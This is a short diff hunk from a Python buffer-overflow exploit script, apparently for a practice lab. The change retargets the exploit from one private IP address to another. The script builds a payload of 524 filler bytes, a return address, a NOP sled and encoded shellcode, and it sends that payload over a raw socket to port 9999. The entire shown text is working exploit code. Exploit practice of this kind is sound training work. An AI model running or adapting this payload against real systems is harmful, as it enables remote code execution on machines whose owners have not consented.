@@ -15,7 +15,7 @@ shellcode = ("\xd9\xee\xbb\x0c\x3d\x0c\xb3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
 string = "A"*524 + retaddr + "\x90"*16 + shellcode
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect=s.connect(('192.168.56.103',9999))
+connect=s.connect(('192.168.56.102',9999))
 s.recv(1024)
 s.send(string + '\r\n')
 s.close()
